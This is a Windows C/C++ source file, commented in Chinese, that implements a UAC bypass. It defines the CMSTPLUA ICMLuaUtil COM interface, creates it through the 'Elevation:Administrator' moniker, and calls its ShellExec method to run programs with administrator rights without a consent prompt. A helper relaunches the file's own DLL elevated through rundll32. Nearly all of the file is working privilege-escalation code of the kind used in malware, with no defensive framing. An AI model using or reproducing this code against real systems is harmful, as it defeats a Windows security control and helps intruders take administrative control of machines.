#define WIN32_LEAN_AND_MEAN             // 从 Windows 头文件中排除极少使用的内容
// Windows 头文件
#define UNICODE
#include <windows.h>
#include <cstdio>
#include <iostream>
#include <fstream>

#include <objbase.h>
#include <strsafe.h>

#include "uac_bypass.h"
#include "dllmain.h"
#include "runtime/utils.h"

#define CLSID_CMSTPLUA                     L"{3E5FC7F9-9A51-4367-9063-A120244FBEC7}"
#define IID_ICMLuaUtil                     L"{6EDD6D74-C007-4E75-B76A-E5740995E24C}"

typedef interface ICMLuaUtil ICMLuaUtil;

typedef struct ICMLuaUtilVtbl {
	BEGIN_INTERFACE

		HRESULT(STDMETHODCALLTYPE* QueryInterface)(
			__RPC__in ICMLuaUtil* This,
			__RPC__in REFIID riid,
			_COM_Outptr_  void** ppvObject);

	ULONG(STDMETHODCALLTYPE* AddRef)(
		__RPC__in ICMLuaUtil* This);

	ULONG(STDMETHODCALLTYPE* Release)(
		__RPC__in ICMLuaUtil* This);

	HRESULT(STDMETHODCALLTYPE* Method1)(
		__RPC__in ICMLuaUtil* This);

	HRESULT(STDMETHODCALLTYPE* Method2)(
		__RPC__in ICMLuaUtil* This);

	HRESULT(STDMETHODCALLTYPE* Method3)(
		__RPC__in ICMLuaUtil* This);

	HRESULT(STDMETHODCALLTYPE* Method4)(
		__RPC__in ICMLuaUtil* This);

	HRESULT(STDMETHODCALLTYPE* Method5)(
		__RPC__in ICMLuaUtil* This);

	HRESULT(STDMETHODCALLTYPE* Method6)(
		__RPC__in ICMLuaUtil* This);

	HRESULT(STDMETHODCALLTYPE* ShellExec)(
		__RPC__in ICMLuaUtil* This,
		_In_     LPCWSTR lpFile,
		_In_opt_  LPCTSTR lpParameters,
		_In_opt_  LPCTSTR lpDirectory,
		_In_      ULONG fMask,
		_In_      ULONG nShow
		);

	HRESULT(STDMETHODCALLTYPE* SetRegistryStringValue)(
		__RPC__in ICMLuaUtil* This,
		_In_      HKEY hKey,
		_In_opt_  LPCTSTR lpSubKey,
		_In_opt_  LPCTSTR lpValueName,
		_In_      LPCTSTR lpValueString
		);

	HRESULT(STDMETHODCALLTYPE* Method9)(
		__RPC__in ICMLuaUtil* This);

	HRESULT(STDMETHODCALLTYPE* Method10)(
		__RPC__in ICMLuaUtil* This);

	HRESULT(STDMETHODCALLTYPE* Method11)(
		__RPC__in ICMLuaUtil* This);

	HRESULT(STDMETHODCALLTYPE* Method12)(
		__RPC__in ICMLuaUtil* This);

	HRESULT(STDMETHODCALLTYPE* Method13)(
		__RPC__in ICMLuaUtil* This);

	HRESULT(STDMETHODCALLTYPE* Method14)(
		__RPC__in ICMLuaUtil* This);

	HRESULT(STDMETHODCALLTYPE* Method15)(
		__RPC__in ICMLuaUtil* This);

	HRESULT(STDMETHODCALLTYPE* Method16)(
		__RPC__in ICMLuaUtil* This);

	HRESULT(STDMETHODCALLTYPE* Method17)(
		__RPC__in ICMLuaUtil* This);

	HRESULT(STDMETHODCALLTYPE* Method18)(
		__RPC__in ICMLuaUtil* This);

	HRESULT(STDMETHODCALLTYPE* Method19)(
		__RPC__in ICMLuaUtil* This);

	HRESULT(STDMETHODCALLTYPE* Method20)(
		__RPC__in ICMLuaUtil* This);
	END_INTERFACE
} *PICMLuaUtilVtbl;

interface ICMLuaUtil
{
	CONST_VTBL struct ICMLuaUtilVtbl* lpVtbl;
};


static HRESULT CoCreateInstanceAsAdmin(HWND hWnd, REFCLSID rclsid, REFIID riid, PVOID* ppVoid)
{
	BIND_OPTS3 bo;
	WCHAR wszCLSID[MAX_PATH] = { 0 };
	WCHAR wszMonikerName[MAX_PATH] = { 0 };
	HRESULT hr = 0;

	// 初始化COM环境
	CoInitialize(NULL);

	// 构造字符串
	StringFromGUID2(rclsid, wszCLSID, (sizeof(wszCLSID) / sizeof(wszCLSID[0])));
	hr = StringCchPrintfW(wszMonikerName, (sizeof(wszMonikerName) /
		sizeof(wszMonikerName[0])), L"Elevation:Administrator!new:%s", wszCLSID);
	if (FAILED(hr))
	{
		return hr;
	}
	// 设置BIND_OPTS3
	RtlZeroMemory(&bo, sizeof(bo));
	bo.cbStruct = sizeof(bo);
	bo.hwnd = hWnd;
	bo.dwClassContext = CLSCTX_LOCAL_SERVER;
	// 创建名称对象并获取COM对象
	hr = CoGetObject(wszMonikerName, &bo, riid, ppVoid);
	return hr;
}

// 以过UAC后的权限执行
BOOL BypassUAC(LPCWSTR lpwszExecutable, LPCWSTR parameter)
{
	HRESULT hr = 0;
	CLSID clsidICMLuaUtil = { 0 };
	IID iidICMLuaUtil = { 0 };
	ICMLuaUtil* CMLuaUtil = NULL;
	BOOL bRet = FALSE;
	do {
		CLSIDFromString(CLSID_CMSTPLUA, &clsidICMLuaUtil);
		IIDFromString(IID_ICMLuaUtil, &iidICMLuaUtil);

		hr = CoCreateInstanceAsAdmin(NULL, clsidICMLuaUtil, iidICMLuaUtil, (PVOID*)(&CMLuaUtil));
		if (FAILED(hr))
		{
			break;
		}

		hr = CMLuaUtil->lpVtbl->ShellExec(CMLuaUtil, lpwszExecutable, parameter, NULL, 0, SW_SHOW);
		if (FAILED(hr))
		{
			break;
		}
		bRet = TRUE;
	} while (FALSE);

	if (CMLuaUtil)
	{
		CMLuaUtil->lpVtbl->Release(CMLuaUtil);
	}
	return bRet;
}

// 通过提权的方法再调用一份提升权限后的本dll。
BOOL BypassUAC(LPCWSTR self_cmd)
{
	wchar_t* p = lstrcat_heap(module_path, L",EntryPoint ");
	LPWSTR parameter = lstrcat_heap(p, self_cmd);
	return BypassUAC(L"C:\\Windows\\System32\\rundll32.exe", parameter);
}

